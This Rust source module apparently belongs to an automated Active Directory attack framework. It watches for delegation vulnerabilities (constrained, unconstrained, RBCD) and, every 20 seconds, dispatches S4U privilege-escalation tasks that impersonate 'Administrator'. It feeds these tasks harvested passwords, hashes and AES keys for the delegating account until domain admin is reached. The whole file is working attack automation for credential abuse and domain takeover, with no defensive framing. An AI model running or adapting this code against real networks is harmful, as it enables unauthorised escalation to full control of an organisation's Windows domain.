//! auto_s4u_exploitation -- exploit delegation vulnerabilities via S4U.
//!
//! When constrained or RBCD delegation vulnerabilities are discovered (via
//! `find_delegation` or BloodHound), this automation dispatches S4U attacks
//! using available credentials for the delegating account.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::dispatcher::Dispatcher;
use crate::state::*;

/// Monitors for delegation vulnerabilities and dispatches S4U attacks.
/// Interval: 20s.
pub async fn auto_s4u_exploitation(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(20));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        let work: Vec<S4uWork> = {
            let state = dispatcher.state.read().await;

            // Skip if already domain admin
            if state.has_domain_admin {
                continue;
            }

            state
                .discovered_vulnerabilities
                .values()
                .filter_map(|vuln| {
                    let vtype = vuln.vuln_type.to_lowercase();
                    if vtype != "constrained_delegation"
                        && vtype != "unconstrained_delegation"
                        && vtype != "rbcd"
                    {
                        return None;
                    }

                    // Already exploited?
                    if state.exploited_vulnerabilities.contains(&vuln.vuln_id) {
                        return None;
                    }

                    let dedup_key = vuln.vuln_id.clone();
                    if state.is_processed(DEDUP_S4U_EXPLOITS, &dedup_key) {
                        return None;
                    }

                    // Extract the delegating account name from details
                    let account_name = vuln
                        .details
                        .get("account_name")
                        .and_then(|v| v.as_str())
                        .or_else(|| vuln.details.get("AccountName").and_then(|v| v.as_str()))
                        .map(|s| s.to_string());

                    let target_spn = vuln
                        .details
                        .get("delegation_target")
                        .and_then(|v| v.as_str())
                        .or_else(|| {
                            vuln.details
                                .get("AllowedToDelegate")
                                .and_then(|v| v.as_str())
                        })
                        .map(|s| s.to_string());

                    // Find a credential or hash for the delegating account
                    let credential = account_name.as_ref().and_then(|acct| {
                        state
                            .credentials
                            .iter()
                            .find(|c| c.username.to_lowercase() == acct.to_lowercase())
                            .cloned()
                    });

                    let hash = account_name.as_ref().and_then(|acct| {
                        state
                            .hashes
                            .iter()
                            .find(|h| h.username.to_lowercase() == acct.to_lowercase())
                            .cloned()
                    });

                    // Need at least a credential or hash to perform S4U
                    if credential.is_none() && hash.is_none() {
                        return None;
                    }

                    // Resolve domain and DC IP
                    let domain = credential
                        .as_ref()
                        .map(|c| c.domain.clone())
                        .or_else(|| hash.as_ref().map(|h| h.domain.clone()))
                        .unwrap_or_default();

                    let dc_ip = state
                        .domain_controllers
                        .get(&domain.to_lowercase())
                        .cloned();

                    Some(S4uWork {
                        dedup_key,
                        vuln: vuln.clone(),
                        credential,
                        hash,
                        target_spn,
                        domain,
                        dc_ip,
                    })
                })
                .collect()
        };

        for item in work {
            let mut payload = json!({
                "technique": "s4u_attack",
                "vuln_type": item.vuln.vuln_type,
                "target": item.vuln.target,
                "domain": item.domain,
                "impersonate": "Administrator",
            });

            if let Some(ref spn) = item.target_spn {
                payload["target_spn"] = json!(spn);
            }
            if let Some(ref dc) = item.dc_ip {
                payload["target_ip"] = json!(dc);
            }

            // Attach credential or hash
            if let Some(ref cred) = item.credential {
                payload["credential"] = json!({
                    "username": cred.username,
                    "password": cred.password,
                    "domain": cred.domain,
                });
            } else if let Some(ref hash) = item.hash {
                payload["hash"] = json!(hash.hash_value);
                payload["username"] = json!(hash.username);
                if let Some(ref aes) = hash.aes_key {
                    payload["aes_key"] = json!(aes);
                }
            }

            match dispatcher
                .throttled_submit("exploit", "privesc", payload, 2)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        vuln_id = %item.vuln.vuln_id,
                        vuln_type = %item.vuln.vuln_type,
                        "S4U exploitation dispatched"
                    );

                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_S4U_EXPLOITS, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_S4U_EXPLOITS, &item.dedup_key)
                        .await;
                }
                Ok(None) => {
                    debug!(vuln_id = %item.vuln.vuln_id, "S4U task deferred by throttler");
                }
                Err(e) => {
                    warn!(err = %e, vuln_id = %item.vuln.vuln_id, "Failed to dispatch S4U exploit")
                }
            }
        }
    }
}

struct S4uWork {
    dedup_key: String,
    vuln: ares_core::models::VulnerabilityInfo,
    credential: Option<ares_core::models::Credential>,
    hash: Option<ares_core::models::Hash>,
    target_spn: Option<String>,
    domain: String,
    dc_ip: Option<String>,
}
